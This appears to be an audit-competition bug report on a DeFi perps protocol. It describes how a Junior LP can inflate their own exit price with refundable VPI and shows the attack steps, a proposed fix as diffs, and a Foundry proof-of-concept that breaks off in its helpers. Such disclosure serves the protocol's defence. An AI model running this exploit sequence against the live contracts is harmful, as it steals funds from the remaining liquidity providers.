# \#98282 [SC-Critical] A Junior LP who also trades can inflate their own exit price with refundable VPI, and the remaining LPs pay the refund

**Submitted on Nov 6th 2026 at 17:25:46 UTC by @Khorxhed for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98282
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

# [Critical-1] A Junior LP who also trades can inflate their own exit price with refundable VPI, and the remaining LPs pay the refund

Impact: Critical (direct theft of user funds)
Likelihood: Medium

## Summary

A trader who raises skew pays a virtual price impact (VPI) charge, `V`, when the position opens. `CfdEngineSettlementSidecar.executeOpen()` puts `V` into pool cash as LP revenue, so it counts as Junior LP equity at once. But it is not final: when the same position closes, `CloseAccountingLib.buildCloseState()` computes a rebate of `V`, and the pool pays it back. LP pricing in `HousePoolAccountingLib.buildReconcileSnapshot()` has no term for this refund, so the Junior share price is too high for as long as the position is open.

A Junior LP can use this against the other Junior LPs. They queue a redemption with `TrancheVault.requestRedeem()`, open a skew-raising position from a second account just before the hourly LP settlement (`HousePool.settleLpEpoch()`), and exit at the inflated price. They then close the position and take `V` back from the pool, so the LPs who stayed pay for value that the exiting LP has already withdrawn. No price move, oracle choice or privileged role is needed, and the cycle repeats every three hours.

In the Proof of Concept, at release parameters, a Junior LP who deposited $5M loses $1,001,990 (20.08% of their stake at the start of the week) in one live trading week.

## Description

`CfdMath.calculateVPI()` prices VPI from a curve `C(S) = k * S^2 / (2 * D)`. `S` is directional skew, `k` is `vpiFactor`, and `D` is pool depth, which `PositionRiskAccountingLib.computeNetPoolDepthAssets()` sets to pool assets minus trader claims. A position that moves skew from `S0` to `S1` pays `V = C(S1) - C(S0)`. Closing the position reverses the move, so at unchanged depth the close pays the same `V` back. A lifetime clamp in `CloseAccountingLib.buildCloseState()` stops a close from returning more than the position paid: if depth has fallen since the open, the fresh rebate is larger than `V` and the clamp cuts it to exactly `V`. While the position is open, `V` is money the pool may have to return.

LP pricing counts `V` as earned the moment it arrives. The Junior share price is Junior principal divided by Junior shares. Each reconcile (`HousePool._reconcile()`) sets total LP principal to `pool assets - trader claims + signed price delta`, using `HousePoolAccountingLib.buildReconcileSnapshot()`. The waterfall (`HousePoolWaterfallAccountingLib.distributeRevenue()`) then gives everything above Senior's claim to Junior. `V` is in pool assets from the moment of the open, so the next reconcile adds all of it to Junior principal while the position that can take it back is still open.

LP exits settle on an hourly epoch. A redemption must be requested with `TrancheVault.requestRedeem()` more than 5 minutes before the hour, but it is priced only when the epoch settles in `HousePool.settleLpEpoch()`. The cutoff fixes who exits, not the NAV they exit at, so a position opened in the last minutes before the hour still changes the exit price.

Together, these let an LP who holds a share `f` of Junior exit for `f * V` more than their shares are worth. Counting the attacker's LP account and trading account together, one cycle works like this:

- **Open:** in `CfdEngineSettlementSidecar.executeOpen()`, the trading account pays `V` into the pool and the execution fee to the treasury.
- **Settlement:** `HousePool._fundRedemptionPhase()` prices the exit with `V` inside Junior NAV, so it pays out `f * V` too much.
- **Close:** in `CfdEngineSettlementSidecar._executeClose()`, the pool pays `V` back to the trading account, less the close fee. `CfdEnginePlanLib._planCloseActionSettlement()` takes that fee out of the refund, so it stays in the pool.
- **Net:** the attacker gains `f * V - 2 * fee`, the Junior LPs who stayed lose `f * V - fee`, and the treasury gains one fee. Senior LPs are not affected.

The existing protections do not stop this:

- The lifetime clamp limits the refund to `V`. It does not recover the `f * V` that already left with the exiting LP.
- The exit lowers depth, so the fresh rebate at close is larger than `V` and the clamp sets it to exactly `V`. The attacker always gets the full refund.
- The one-hour deposit cooldown and the 5-minute cutoff in `TrancheVault.requestRedeem()` limit when an exit can be requested. They do not stop a position from opening after the request.
- The withdrawal firewall (`HousePool._juniorSettlementCapacity()`) limits the size of an exit, not its price.

This breaks behaviour the project documents. The whitepaper says the epoch delay "is not a substitute for exact valuation" and that "Every valid snapshot therefore applies one economic state to both LP entry and exit" (`packages/perps/WHITEPAPER.md:734-740`). For negative VPI the protocol already keeps the matching amount out of NAV: "The reserve is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles" (`packages/perps/WHITEPAPER.md:887-888`). Positive VPI has the same kind of matching obligation, the refund at close, but no such exclusion. For entries, `packages/perps/SECURITY.md:859-860` says new LPs "do not inherit old trader obligations at a higher deposit NAV"; here the LPs who stay inherit the refund after the exiting LP was paid on it. The clamp comment in `CloseAccountingLib.buildCloseState()` (`packages/perps/src/libraries/CloseAccountingLib.sol:112`, "Prevents LP sandwich attacks") shows that LP sandwiches around VPI are not intended.

The known issues cover depth changes that alter the size of a trader's VPI ("Temporary pool liquidity can reduce a skew-increasing close charge" and "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate"). Here the VPI is sized correctly and fully clamped; the defect is the LP share price while a refundable charge is outstanding. `packages/perps/SECURITY.md:863` says VPI stays "outside the pre-close price book", which explains why NAV has no VPI term, but it does not say an LP may exit on VPI the pool can still refund. The LP entry and exit parity tests, such as `TerminalNavIntegrationSecurityTest.test_JuniorDepositAndRedeemUseIdenticalSignedNavWithLiveUnrealizedPnl()`, run with `vpiFactor: 0`, so this case is not tested. This report does not cover NAV staying low while a negative-VPI rebate sits in the opener's reserve, which the documents state as intended (`packages/perps/ACCOUNTING_SPEC.md:1064-1066`, `packages/perps/SECURITY.md:866` and `:872`).

### Root Cause

The same `V` is recorded twice with opposite meanings: as LP revenue in the pool, and as a refundable `vpiAccrued` on the position. LP pricing never reads `vpiAccrued`. `HousePoolInputSnapshot` has no VPI field, and `HousePool`, `HousePoolAccountingLib`, `HousePoolReconcilePlanLib`, `HousePoolWaterfallAccountingLib`, `CfdEngineProtocolLens` and `TrancheVault` do not reference VPI at all. `TerminalNavBookV2`, which supplies the signed price delta, reads `CfdEngine.positions()` in `TerminalNavBookV2._curveInputFromEngine()` but skips the `vpiAccrued` value (`packages/perps/src/TerminalNavBookV2.sol:422`).

At open, `OpenAccountingLib.tryBuildOpenState()` sets `tradeCostAssets` to `V` plus the execution fee (`packages/perps/src/libraries/OpenAccountingLib.sol:135`). `MarginClearinghouse.applyOpenCost()` credits the fee to the treasury and returns it as `protocolFeeCreditedAssets`, so the rest, `V`, is recorded as LP revenue:

`CfdEngineSettlementSidecar.executeOpen()` (`packages/perps/src/CfdEngineSettlementSidecar.sol:454-464`)
```solidity
    if (delta.tradeCostAssets > 0) {
@>      uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
        if (poolCashInflowAssets > 0) {
            IHousePool(host.pool())
                .recordClaimantInflow(
                    poolCashInflowAssets,
@>                  IHousePool.ClaimantInflowKind.Revenue,
                    IHousePool.ClaimantInflowCashMode.CashArrived
                );
        }
    }
```

The same `V` is stored on the position as `vpiAccrued`:

`CfdEnginePlanLib.planOpen()` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:387`)
```solidity
@>  delta.posVpiAccruedDelta = openState.vpiAssets;
```

`CfdEngineSettlementSidecar._writeOpenPosition()` (`packages/perps/src/CfdEngineSettlementSidecar.sol:517`)
```solidity
@>  vpiAccrued: currentPosition.vpiAccrued + delta.posVpiAccruedDelta,
```

Terminal NAV starts from pool assets, which include `V` once `HousePool.recordClaimantInflow()` adds it to `accountedAssets` (`packages/perps/src/HousePool.sol:640-642`). NAV then adds no liability for the refund. This is the core defect:

`HousePoolAccountingLib.buildReconcileSnapshot()` (`packages/perps/src/libraries/HousePoolAccountingLib.sol:57-78`)
```solidity
    /// @notice Builds the single canonical terminal-NAV snapshot shared by LP entry and exit pricing.
    /// @param engineSnapshot Engine accounting inputs.
    /// @return snapshot Terminal LP equity and explicit deficit after claims and the signed terminal delta.
    function buildReconcileSnapshot(
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
    ) internal pure returns (ReconcileSnapshot memory snapshot) {
@>      uint256 terminalAssets = engineSnapshot.physicalAssets; // @audit pool cash, which now includes V
@>      uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets; // @audit nothing for the refundable V
        int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
        if (terminalDelta >= 0) {
            terminalAssets += uint256(terminalDelta);
        } else {
            // This form also handles `type(int256).min` without negating it directly.
            terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
        }

        if (terminalAssets >= terminalLiabilities) {
            snapshot.distributable = terminalAssets - terminalLiabilities;
        } else {
            snapshot.deficit = terminalLiabilities - terminalAssets;
        }
    }
```

Epoch settlement calls `HousePool._reconcile()` first, which adds `V` to `juniorPrincipal` through `HousePoolWaterfallAccountingLib.planReconcile()` and `HousePoolWaterfallAccountingLib.distributeRevenue()` (`packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:104-109` and `:158`). It then prices the queued Junior exit on that principal:

`HousePool._settleLpEpoch()` (`packages/perps/src/HousePool.sol:835-841`)
```solidity
@>  _reconcile(accountingSnapshot, statusSnapshot);
    _checkpointEngineCarryIndexes();

    result.cutoffEpoch = cutoffEpoch;
    RedemptionPhase memory juniorPhase;
@>  juniorPhase.pricingPrincipal = juniorPrincipal;
    juniorPhase.pricingSupply = _juniorShareSupply();
```

At close, the skew-reducing trade earns a fresh rebate, and the lifetime clamp caps it at the position's `vpiAccrued`, which is `V`:

`CloseAccountingLib.buildCloseState()` (`packages/perps/src/libraries/CloseAccountingLib.sol:103-118`)
```solidity
    state.proportionalAccrualAssets =
        (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
    // With no economic depth, keep protective exits live without creating a fresh charge or rebate.
    // The lifetime clamp below still recovers any previously received negative VPI.
    if (inputs.poolDepthAssets != 0) {
@>      state.vpiDeltaAssets = CfdMath.calculateVPI(
            inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
        );
    }
    // Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
    // where an attacker opens at high depth, reduces pool depth, then closes to extract a
    // net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
    // stale-price risk is priced separately through frozenSpreadAssets.
    if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
@>      state.vpiDeltaAssets = -state.proportionalAccrualAssets;
    }
```

The pool pays this refund from its own cash in `CfdEngineSettlementSidecar._executeClose()` (`packages/perps/src/CfdEngineSettlementSidecar.sol:621-624`).

## Attack Path

The attacker uses two accounts: an LP account `A`, which holds Junior shares, and a trading account `B`, which holds margin in `MarginClearinghouse`. Two accounts are used for clarity; one account can do both.

Preconditions:

- The market is in live hours, outside the Friday-to-Sunday FAD and frozen windows.
- `A` holds, or deposits to reach, a large share `f` of Junior: more than about 40% with no other skew, or less when skew already exists (see Likelihood).
- There is room under the 40% skew cap, and enough free pool cash to fund `A`'s exit.

In the steps below, `T` is the next round hour.

1. **Deposit.** `A` calls `TrancheVault.requestDeposit()` on the Junior vault. At the next hour anyone calls `OrderRouter.settleLpEpoch()`, and `A` calls `TrancheVault.claimDepositShares()`. `A` can skip this step if it already holds the shares.
2. **Queue the exit.** After the one-hour deposit cooldown, and more than 5 minutes before `T`, `A` calls `TrancheVault.requestRedeem()` for all its shares. The request is now in the queue for the epoch that settles at `T`, but its price is set only at `T`.
3. **Open just before the hour.** About 30 seconds before `T`, `B` calls `OrderRouter.commitOrder()` for a long (or short) that takes skew up to the 40% cap. `B` then calls `OrderRouter.executeOrder()` with a fresh Pyth update; any keeper can do this too. The open charges `V` and the execution fee. `CfdEngineSettlementSidecar.executeOpen()` credits the fee to the treasury, records `V` in the pool as `Revenue`, and stores `V` on the position as `vpiAccrued`. Junior NAV is now higher by `V`.
4. **Settle.** At `T`, anyone calls `OrderRouter.settleLpEpoch()`, which calls `HousePool.settleLpEpoch()`. `HousePool._reconcile()` adds `V` to `juniorPrincipal`, and `HousePool._fundRedemptionPhase()` prices `A`'s queued shares on that principal. `A`'s exit is funded with `f * V` that the pool will have to pay back.
5. **Claim.** `A` calls `TrancheVault.redeem()` and receives the USDG, including the extra `f * V`.
6. **Close.** `B` closes the whole position with `OrderRouter.commitOrder()` and `OrderRouter.executeOrder()`. The exit in step 4 lowered depth, so the fresh rebate is larger than `V`; the lifetime clamp in `CloseAccountingLib.buildCloseState()` sets it to exactly `V`. The pool pays `V` minus the close fee to `B` through `HousePool.payOut()`.
7. **Result of one cycle.** The attacker is up `f * V - 2 * fee`. The Junior LPs who stayed are down `f * V - fee`. The treasury holds the open fee.
8. **Repeat.** `A` deposits again for the next hour and the cycle restarts at step 1. One cycle takes three hours, so 39 cycles fit in one live trading week.

## Impact

Junior LPs who stay in the pool lose principal to the attacker, and the attack repeats. This matches the program's Critical impact "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield": the victim's Junior balance ends below what it held before, so this is not only lost yield.

The users harmed are the Junior LPs who stay in the `TrancheVault` while the attack runs, and the asset is the settlement token, USDG. Senior LPs are not affected. The treasury receives the open fees as a side effect.

The size of each cycle follows from the VPI formula in `CfdMath.calculateVPI()`. With no other skew, a position at the 40% skew cap, release `vpiFactor` of 0.01 and the 4 bps execution fee, where `D` is depth and `f` the attacker's share of Junior:

- `V = 0.005 * (0.4D)^2 / D`, which is 8 bps of depth.
- Each fee is 4 bps of the `0.4D` position, which is 1.6 bps of depth.
- The Junior LPs who stay lose `f * V - fee`, which is `(8f - 1.6)` bps of depth per cycle, at most 6.4 bps.
- The attacker nets `f * V - 2 * fee`, which is `(8f - 3.2)` bps of depth per cycle, so it breaks even at `f` = 40%.

Senior capital makes this worse for Junior LPs: `V` grows with total depth, which includes Senior, but `HousePoolWaterfallAccountingLib.distributeRevenue()` gives all of `V` to Junior.

The table below is an example, measured by the PoC (`test_refundableVpiInflatesJuniorExit`, in the Proof of Concept section). It uses the release parameters in `packages/perps/DEPLOYMENT.md` and a flat price of 1.00. Senior holds $15M, the victim holds $5M of Junior, and the attacker deposits $29.5M of Junior (85.5% of Junior). Each column is compared with the same run without the position, from the same state, so the Senior coupon cancels out. Amounts are rounded to the dollar.

| PoC result | One cycle | One live week, 39 cycles |
|---|---|---|
| Victim Junior LP | -$25,941 | -$1,001,990 (20.08% of the stake at the start of the week) |
| Attacker, after all fees | +$18,021 | +$700,592 |
| Treasury, open fees | +$7,920 | +$301,398 |
| Senior LPs | $0 | $0 |

The loss does not stop after a week. It continues for as long as the victims stay in the pool, and in practice it ends only when they notice and redeem.

## Likelihood

Likelihood is moderate. No role, price move or luck is needed, and the attack runs on a fixed schedule. The limit is capital: the attacker must hold or bring a large share of Junior.

- **Permissions:** none. `TrancheVault.requestDeposit()`, `OrderRouter.commitOrder()`, `OrderRouter.executeOrder()` and `OrderRouter.settleLpEpoch()` are all permissionless.
- **Capital:** a Junior share above about 40% with no other skew, plus margin for the position. In the PoC this is a $29.5M deposit and margin of 1% of the position. The capital comes back every cycle, and the fees are paid out of the profit. When skew is already near the cap, `V` reaches 40 bps of the new position against 8 bps of fees, so the break-even share falls to about 20% (from the formula, not measured in the PoC).
- **Timing:** the exit request must come more than 5 minutes before the hour and after the one-hour deposit cooldown. The open must execute before settlement; the PoC opens 30 seconds before the hour. `OrderRouter.executeOrder()` runs orders from one global FIFO queue, so earlier orders must be executed first, which anyone can do. `OracleFreshnessPolicyLib.getPolicy()` makes the market close-only during FAD and frozen hours, which leaves about 119 live hours a week.
- **Repeatability:** one cycle takes three hours (deposit activation, cooldown, exit epoch). That allows up to 8 cycles a day and 39 in a live week, as in the PoC.

Limits:

- The position is open for about a minute per cycle, so the attacker carries a small price risk. The PoC uses a flat price and zero oracle confidence.
- `HousePool._juniorSettlementCapacity()` caps each exit by free cash, so the deposit must shrink as the pool shrinks; the PoC sizes it at 1.475 times the rest of the pool. The same function applies the Senior ratio cap, which limits the exit when Senior is near 80% of the pool.
- If `OrderRouter.settleLpEpoch()` runs before the open executes, the exit is priced without `V` and the attacker only pays fees.
- Victims can leave through the same hourly queue, and an exit in the same epoch as the attacker's gets the same inflated price.


## Recommendation

LP pricing should not count money that can still go back to the trader. Treat outstanding positive `vpiAccrued` as a liability in terminal NAV until the position closes. LP entries and exits use the same snapshot, so both are then priced without it.

Keep one aggregate in `CfdEngine`, updated wherever a position's `vpiAccrued` is written or deleted. First the new state variable:

`CfdEngine` state variables (`packages/perps/src/CfdEngine.sol:131-132`)
```diff
     /// @notice Aggregate outstanding trader-claim liability, in 6-decimal settlement token units.
     uint256 public totalTraderClaimBalanceAssets;
+    /// @notice Sum of positive `vpiAccrued` over open positions: VPI that closes may still refund.
+    uint256 public totalPositiveVpiAccruedAssets;
```

Then update it where a position is written:

`CfdEngine.settlementWritePosition()` (`packages/perps/src/CfdEngine.sol:1268-1271`)
```diff
         pos.lastCarryIndex = _currentSideCarryIndex(position.side, block.timestamp, _poolAssetsForCarry());
+        totalPositiveVpiAccruedAssets =
+            totalPositiveVpiAccruedAssets - _positivePart(pos.vpiAccrued) + _positivePart(position.vpiAccrued);
         pos.vpiAccrued = position.vpiAccrued;
         _applySideBorrowBaseDelta(position.side, 0, newBorrowBaseAssets);
     }
```

And where a position is deleted, with a small helper:

`CfdEngine.settlementDeletePosition()` (`packages/perps/src/CfdEngine.sol:1279-1284`)
```diff
         StoredPosition storage pos = _positions[account];
         if (pos.lots > 0 || pos.borrowBaseAssets > 0) {
             _applySideBorrowBaseDelta(pos.side, pos.borrowBaseAssets, 0);
         }
+        totalPositiveVpiAccruedAssets -= _positivePart(pos.vpiAccrued);
         delete _positions[account];
     }
+
+    function _positivePart(
+        int256 value
+    ) private pure returns (uint256) {
+        return value > 0 ? uint256(value) : 0;
+    }
```

Pass it to the pool through the input snapshot:

`HousePoolEngineViewTypes.HousePoolInputSnapshot` struct (`packages/perps/src/interfaces/HousePoolEngineViewTypes.sol:32-33`)
```diff
         uint256 traderClaimBalanceAssets;
+        uint256 refundableVpiAssets;
         bool hasOpenPositions;
```

`CfdEngineProtocolLens.getHousePoolInputSnapshot()` (`packages/perps/src/CfdEngineProtocolLens.sol:72-73`)
```diff
         snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
+        snapshot.refundableVpiAssets = engineContract.totalPositiveVpiAccruedAssets();
         snapshot.hasOpenPositions = terminalSnapshot.hasOpenPositions;
```

And subtract it in terminal NAV:

`HousePoolAccountingLib.buildReconcileSnapshot()` (`packages/perps/src/libraries/HousePoolAccountingLib.sol:63-65`)
```diff
         uint256 terminalAssets = engineSnapshot.physicalAssets;
-        uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
+        uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets + engineSnapshot.refundableVpiAssets;
         int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
```

With this change, an open raises pool cash and the liability by `V`, so NAV does not move, and a close lowers both, so only the fee reaches LPs. If a position is liquidated, or its refund is smaller than `V`, the liability clears and the amount the pool keeps becomes revenue at that point. LPs still earn every amount that is final, only later. The aggregate is an upper bound on what closes can refund, which is the safe direction. This is a sketch and has not been implemented or tested.

A delay on recognising VPI, or a block on one address both trading and redeeming, would not fix this. The attacker can hold the position longer for a small carry cost, and accounts are easy to separate.



## Proof of Concept

## Proof of Concept
Create a test file inside packages/perps/test/ and paste the below code there and run
```bash
forge test --root packages/perps --mt test_refundableVpiInflatesJuniorExit -vvvv
```

Run this to see the logs only
```bash
forge test --root packages/perps --mt test_refundableVpiInflatesJuniorExit -vvv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

contract Poc is BasePerpTest {

    // The victim is this test contract, address(this). The fixture already gave it the Junior seed and a $1M deposit.
    address internal constant SENIOR_LP = address(0x5E10);
    address internal constant ATTACKER_LP = address(0xA11CE); // the attacker's LP account, which holds Junior shares
    address internal constant ATTACKER_TRADER = address(0xB0B); // the attacker's trading account, which holds margin

    /// @dev Balances read at the end of a run, so that an attack run can be compared with its control run.
    struct Balances {
        uint256 attackerLpCash; // USDG held by the attacker's LP account, which is its exit proceeds
        uint256 attackerTraderBalance; // clearinghouse balance of the attacker's trading account
        uint256 victimJunior; // value of the victim's Junior shares
        uint256 seniorAssets; // value of all Senior shares
        uint256 treasury; // clearinghouse balance of the protocol treasury
    }

    /// @notice A Junior LP who also trades can exit at a share price inflated by refundable VPI. The Junior LPs who
    ///         stay in the pool pay the refund when the position closes.
    /// @dev Part 1 runs one cycle and compares it with the same exit made without the position, from one snapshot.
    ///      Part 2 repeats the cycle for one live trading week and compares it with the same week without the position.
    ///      Orders, fills and LP settlement all go through the public OrderRouter and TrancheVault functions. The price
    ///      stays at 1.00 for the whole test, so no price move is involved.
    function test_refundableVpiInflatesJuniorExit() public {
        // ------------------------------------------------------------------------------------------------------------
        // Setup 1. Release parameters from packages/perps/DEPLOYMENT.md, applied through the real 72-hour timelocks.
        // ------------------------------------------------------------------------------------------------------------
        _applyReleaseParameters();

        // ------------------------------------------------------------------------------------------------------------
        // Setup 2. The pool before the attacker arrives: the victim holds $5M of Junior and Senior holds $15M.
        // ------------------------------------------------------------------------------------------------------------
        _fundJunior(address(this), 3_999_000e6); // $1,000 seed + $1M fixture deposit + $3,999,000 = $5M
        _fundSenior(SENIOR_LP, 15_000_000e6);
        _fundTrader(ATTACKER_TRADER, 2_000_000e6); // margin for the attacker's trading account
        uint256 poolFunded = vm.snapshotState();

        // ============================================================================================================
        // Part 1. One cycle, compared with the same exit made without the position.
        // ============================================================================================================

        // Step 1. The attacker deposits $29.5M into Junior and waits out the one-hour deposit cooldown.
        _fundJunior(ATTACKER_LP, 29_500_000e6);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 10);
        // `f` is the attacker's share of Junior, where 1e18 = 100%.
        uint256 f = (juniorVault.balanceOf(ATTACKER_LP) * 1e18) / juniorVault.totalSupply();

        // Step 2. More than 5 minutes before the next round hour, the attacker queues a redemption of all its shares.
        //         The queue is now fixed, but the exit price is set only when the epoch settles at the hour.
        (uint256 exitId, uint256 settleTime) = _queueFullExit(ATTACKER_LP);
        uint256 beforeOpen = vm.snapshotState();

        // Control: the same exit at the same time, with no position opened.
        _settleLpEpochAt(settleTime);
        _claimExit(ATTACKER_LP);
        vm.warp(settleTime + 1 minutes); // both runs are read at the same time, so the Senior coupon is the same
        Balances memory control = _readBalances();
        vm.revertToState(beforeOpen);

        // Step 3. 30 seconds before the hour, the trading account opens a long that takes skew to the 40% cap.
        //         It pays VPI `V` plus the 4 bps execution fee. The fee goes to the treasury. `V` goes into pool
        //         cash as LP revenue, and the same `V` is stored on the position as `vpiAccrued`, refundable at close.
        vm.warp(settleTime - 30);
        uint256 depth = _poolDepth();
        uint256 lots = (depth * 4) / 10 / 100e6; // 40% of depth; one lot is 100 tokens, $100 at price 1.00
        uint256 notional = lots * 100e6;
        uint256 fee = (notional * engine.executionFeeBps()) / 10_000;
        uint256 juniorBeforeOpen = juniorVault.totalAssets();
        uint256 traderBeforeOpen = clearinghouse.balanceAssets(ATTACKER_TRADER);
        _openLong(ATTACKER_TRADER, lots);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER_TRADER);
        uint256 v = uint256(vpiAccrued);
        uint256 juniorRiseAtOpen = juniorVault.totalAssets() - juniorBeforeOpen;
        assertGt(v, 0, "the open pays VPI");
        assertApproxEqAbs(
            traderBeforeOpen - clearinghouse.balanceAssets(ATTACKER_TRADER), v + fee, 1e6, "the open costs V + fee"
        );
        // The refundable `V` already counts as Junior equity, while the position that can take it back is still open.
        assertApproxEqAbs(juniorRiseAtOpen, v, 1e6, "Junior NAV rises by V at the open");

        // Step 4. At the hour, anyone settles the LP epoch. Reconcile adds `V` to Junior principal, and the queued exit
        //         is priced on that principal, so the attacker's shares are paid at a price that includes `V`.
        _settleLpEpochAt(settleTime);
        assertEq(juniorVault.pendingRedeemRequest(exitId, ATTACKER_LP), 0, "the exit must be funded in full");

        // Step 5. The attacker claims the exit. It pays `f * V` more than the control exit.
        _claimExit(ATTACKER_LP);
        uint256 exitOverpaid = settlementToken.balanceOf(ATTACKER_LP) - control.attackerLpCash;
        assertApproxEqRel(exitOverpaid, (f * v) / 1e18, 0.001e18, "the exit is overpaid by f * V");

        // Step 6. The trading account closes. The exit lowered depth, so the fresh rebate is above `V` and the lifetime
        //         clamp cuts it to exactly `V`. The pool pays `V` less the close fee back to the trading account.
        uint256 traderBeforeClose = clearinghouse.balanceAssets(ATTACKER_TRADER);
        _closeLong(ATTACKER_TRADER, lots);
        (uint256 sizeLeft,,,,,,) = engine.positions(ATTACKER_TRADER);
        assertEq(sizeLeft, 0, "the position must be fully closed");
        assertApproxEqAbs(
            clearinghouse.balanceAssets(ATTACKER_TRADER) - traderBeforeClose, v - fee, 5e6, "the close refunds V - fee"
        );

        // Result of the cycle, against the control. Both runs are read at the same time.
        vm.warp(settleTime + 1 minutes);
        Balances memory attack = _readBalances();
        int256 tradingCost = _change(attack.attackerTraderBalance, control.attackerTraderBalance);
        int256 attackerNet = int256(exitOverpaid) + tradingCost;
        int256 victimChange = _change(attack.victimJunior, control.victimJunior);
        int256 treasuryGain = _change(attack.treasury, control.treasury);
        int256 seniorChange = _change(attack.seniorAssets, control.seniorAssets);
        emit log("=== Part 1: one cycle, against the same exit without the position ===");
        emit log_named_decimal_uint("Pool depth before the open", depth, 6);
        emit log_named_decimal_uint("Attacker share of Junior, %", f / 1e14, 2);
        emit log_named_decimal_uint("Position notional, 40% of depth", notional, 6);
        emit log_named_decimal_uint("V paid at open and stored as vpiAccrued", v, 6);
        emit log_named_decimal_uint("Junior NAV rise at the open", juniorRiseAtOpen, 6);
        emit log_named_decimal_uint("Execution fee per side", fee, 6);
        emit log_named_decimal_uint("Exit overpaid against the control", exitOverpaid, 6);
        emit log_named_decimal_int("Attacker trading cost", tradingCost, 6);
        emit log_named_decimal_int("Attacker net", attackerNet, 6);
        emit log_named_decimal_int("Victim Junior LP change", victimChange, 6);
        emit log_named_decimal_int("Treasury change", treasuryGain, 6);
        emit log_named_decimal_int("Senior change", seniorChange, 6);
        assertGt(attackerNet, 0, "the attacker profits after paying both fees");
        assertLt(victimChange, 0, "the victim Junior LP loses");
        assertApproxEqAbs(-victimChange, int256(exitOverpaid - fee), 5e6, "the victim loses f * V less the close fee");
        assertApproxEqAbs(seniorChange, 0, 1e6, "Senior is not affected");
        assertApproxEqAbs(attackerNet + victimChange + treasuryGain + seniorChange, 0, 1e6, "value is conserved");

        // ============================================================================================================
        // Part 2. The same cycle repeated for one live trading week, against the same week without the position.
        // ============================================================================================================
        // One cycle takes three hours: deposit activation, the one-hour cooldown, then the exit epoch. From Sunday
        // 22:00 UTC, 39 cycles fit before the Friday FAD window; the last open is Friday 19:00 UTC minus 30 seconds.
        // Run 0 makes the attack. Run 1 repeats the same deposit-and-exit schedule without opening any position.
        vm.revertToState(poolFunded);
        _warpToSundayEvening();
        settlementToken.mint(ATTACKER_LP, 30_000_000e6); // working capital, returned every cycle
        uint256 weekStart = vm.snapshotState();
        uint256 startTime = vm.getBlockTimestamp();
        uint256 victimStart = _juniorValue(address(this));
        Balances[2] memory weekEnd; // index 0: with the attack, index 1: without it
        for (uint256 run; run < 2; ++run) {
            vm.revertToState(weekStart);
            weekStart = vm.snapshotState();
            for (uint256 cycle; cycle < 39; ++cycle) {
                settleTime = _runCycle(run == 0);
            }
            vm.warp(settleTime + 1 minutes); // both runs are read at the same time
            weekEnd[run] = _readBalances();
        }

        // Result of the week, against the same week without the position.
        uint256 weekLoss = weekEnd[1].victimJunior - weekEnd[0].victimJunior;
        uint256 weekProfit = (weekEnd[0].attackerLpCash + weekEnd[0].attackerTraderBalance)
            - (weekEnd[1].attackerLpCash + weekEnd[1].attackerTraderBalance);
        uint256 weekTreasury = weekEnd[0].treasury - weekEnd[1].treasury;
        emit log("=== Part 2: one live week of 39 cycles, against the same week without the position ===");
        emit log_named_uint("Hours from the first deposit to the last exit", (settleTime - startTime) / 1 hours);
        emit log_named_decimal_uint("Victim Junior LP at the start of the week", victimStart, 6);
        emit log_named_decimal_uint("Victim Junior LP at the end, without the attack", weekEnd[1].victimJunior, 6);
        emit log_named_decimal_uint("Victim Junior LP at the end, with the attack", weekEnd[0].victimJunior, 6);
        emit log_named_decimal_uint("Victim loss caused by the attack", weekLoss, 6);
        emit log_named_decimal_uint("Victim loss, % of the starting stake", (weekLoss * 10_000) / victimStart, 2);
        emit log_named_decimal_uint("Attacker profit after all fees", weekProfit, 6);
        emit log_named_decimal_uint("Treasury gain from the open fees", weekTreasury, 6);
        assertGt(weekProfit, 0, "the attacker profits over the week");
        assertApproxEqAbs(weekEnd[0].seniorAssets, weekEnd[1].seniorAssets, 1e6, "Senior is not affected");
        assertApproxEqAbs(weekLoss, weekProfit + weekTreasury, 1e6, "the loss goes to the attacker and treasury");
        assertGt((weekLoss * 10_000) / victimStart, 1900, "the attack takes more than 19% of the victim's stake");
    }

    // ================================================================================================================
    // Helpers. Each one only groups the public calls that a step of the test makes.

    // ================================================================================================================

    /// @dev One three-hour cycle of Part 2, Steps 1 to 6. With `openPosition` false it makes the same deposit and the
    ///      same exit without opening a position, which is the control week.
    /// @return settleTime The hour at which this cycle's exit epoch settled.
    function _runCycle(
